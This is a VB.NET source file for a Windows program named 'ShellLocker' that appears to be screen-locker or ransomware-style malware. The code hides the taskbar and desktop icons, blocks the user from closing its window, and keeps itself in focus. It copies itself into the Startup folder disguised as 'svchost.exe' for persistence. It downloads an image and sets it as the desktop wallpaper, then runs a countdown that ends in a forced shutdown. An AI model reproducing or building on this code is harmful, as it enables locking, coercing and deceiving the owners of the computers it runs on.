﻿    Option Explicit On
    Imports System
    Imports System.Collections.Generic
    Imports System.ComponentModel
    Imports System.Diagnostics
    Imports System.Drawing
    Imports System.IO
    Imports System.Runtime.CompilerServices
    Imports System.Runtime.InteropServices
    Imports System.Security.Cryptography
    Imports System.Threading
    Imports System.Windows.Forms
    Imports Microsoft.VisualBasic.CompilerServices
    Imports ShellLocker.My
    Imports ShellLocker.AES
    Imports System.Net
    Imports ShellLocker.Form2
    Imports ShellLocker.Desktop
    Imports Microsoft.VisualBasic.FileIO
Imports System.Reflection



Public Class Form1


        Protected Overrides ReadOnly Property CreateParams() As CreateParams
            Get
                Dim cp As CreateParams = MyBase.CreateParams
                Const CS_NOCLOSE As Integer = &H200
                cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
                Return cp
            End Get
        End Property

    #Region "Taskbar"
        Private Declare Auto Function FindWindow Lib "user32" (
        ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
        Private Declare Auto Sub SetWindowPos Lib "User32" (
        ByVal hWnd As Integer,
        ByVal hWndInsertAfter As Integer,
        ByVal X As Integer,
        ByVal Y As Integer,
        ByVal cx As Integer,
        ByVal cy As Integer,
        ByVal wFlags As Integer)
        Public Sub TaskBarVisible(ByVal Visible As Boolean)
            Dim Handle As Integer = FindWindow("Shell_TrayWnd", "")
            If Visible = True Then
                SetWindowPos(Handle, 0, 0, 0, 0, 0, 64)
            Else
                SetWindowPos(Handle, 0, 0, 0, 0, 0, 128)
            End If
        End Sub
    #End Region

    #Region "Declare"
        Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte,
    ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
        Public Const VK_LWIN = &H5B
        Public Const KEYEVENTF_KEYUP = &H2

        Dim i As Integer
        Dim i2 As Integer
        Dim i3 As Integer
        Dim i4 As Integer
        Dim i5 As Integer

        Dim Location As String

        Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer

        Private Const SETDESKWALLPAPER = 20
        Private Const UPDATEINIFILE = &H1
        Private Declare Ansi Function GetAsyncKeyState Lib "user32" (vkey As Integer) As Integer
        Private erhaltenerText As RichTextBox

        Private path1 As String

        Private path2 As String

        Private userDir As Object

        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()
    #End Region

        Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

#Region "Put form2 on screen 2"
        Try
            Dim screen As Screen
            screen = Screen.AllScreens(1)
            Form2.StartPosition = FormStartPosition.Manual
            Form2.Location = screen.Bounds.Location + New Point(100, 100)
            Form2.Show()
            Timer2.Start()
        Catch ex As Exception

        End Try
#End Region

        TaskBarVisible(False)
        Form3.Show()
        Form4.Show()

        Desktop.DesktopIconsHide()

        Try
            File.Copy(Application.ExecutablePath, "C:\Users\" + Environment.UserName + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe")
        Catch ex As Exception

        End Try

#Region "Background"
        Try

            Dim Location As String
            Dim Client As New WebClient
            Client.DownloadFile("http://i.imgur.com/TqykUo3.png", My.Computer.FileSystem.SpecialDirectories.Temp & "TqykUo3.png")
            Client.Dispose()

            Location = (My.Computer.FileSystem.SpecialDirectories.Temp & "TqykUo3.png")

            PictureBox1.BackgroundImage = Image.FromFile(My.Computer.FileSystem.SpecialDirectories.Temp & "TqykUo3.png")

            PictureBox1.BackgroundImageLayout = ImageLayout.Stretch

            SystemParametersInfo(SETDESKWALLPAPER, 0, Location, UPDATEINIFILE)


        Catch ex As Exception

        End Try
#End Region

    End Sub

        Private Sub Form1_LostFocus(ByVal sender As Object, ByVal e As System.EventArgs) Handles MyBase.LostFocus

            Me.Focus() ' when form object loses focus (another form, control, or program - form always has focus)

        End Sub

        Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
            If (e.CloseReason = CloseReason.UserClosing) Then
                e.Cancel = True
            End If
        End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.BringToFront()
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Label13.Text = Label13.Text - 1

        If Label13.Text = 10 Then
            Label13.ForeColor = Color.Red
        End If

        If Label13.Text = 0 Then
            Label13.ForeColor = Color.White
            Label10.Text = Label10.Text - 1
            Label13.Text = 59
        End If

        If Label10.Text = 10 Then
            Label10.ForeColor = Color.Red
        End If

        If Label10.Text = 0 Then
            Label10.ForeColor = Color.White
            Label8.Text = Label8.Text - 1
            Label10.Text = 59
        End If

        If Label8.Text = 10 Then
            Label8.ForeColor = Color.Red
        End If

        If Label8.Text = 0 Then
            Label13.ForeColor = Color.White
            Shell("shutdown -s -t 3")
        End If
    End Sub
End Class
